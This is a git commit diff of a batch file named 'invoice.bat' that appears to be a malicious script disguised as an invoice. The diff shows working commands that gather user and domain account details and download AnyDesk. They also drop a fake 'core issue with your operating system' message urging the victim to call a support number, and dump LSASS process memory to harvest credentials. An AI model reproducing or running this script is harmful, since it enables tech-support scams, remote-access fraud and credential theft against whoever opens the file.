1f1d02fd7d6b6ce7f4d3dd736f59490365f29178
Bushy22 <69621677+Bushy22@users.noreply.github.com>
2023-09-17 15:33:10 +0800

    Update invoice.bat

--- invoice.bat
+++ invoice.bat
@@ -1,15 +1,13 @@
-whoami.exe /all > $env:UserProfile\Documents\fun.txt
+whoami.exe /all > fun.txt
 
-net.exe user administrator > $env:UserProfile\Documents\fun.txt
+net.exe user administrator > fun.txt
 
-net.exe groups /domain > $env:UserProfile\Documents\fun.txt
+net.exe groups /domain > fun.txt
 
 powershell Invoke-WebRequest -Uri "https://anydesk.com/en-au/downloads/windows?dv=win_exe" -UseBasicParsing -OutFile "$env:UserProfile\Desktop\anydesk.exe"
 
-powershell New-Item "$env:UserProfile\Desktop\Important.txt" -ItemType File -Value "There is a core issue with your operating system. Open AnyDesk in your downloads and call the support number: 0404 810 855"
+New-Item "$env:UserProfile\Desktop\Important.txt" -ItemType File -Value "There is a core issue with your operating system. Open AnyDesk in your downloads and call the support number: 0404 810 855"
 
 powershell start "$env:UserProfile\Desktop\Important.txt"
-
-powershell Start-Sleep -Seconds 120
 
 powershell rundll32.exe C:\\Windows\\System32\\comsvcs.dll #+0000^24 (Get-Process lsass).Id dump.bin full
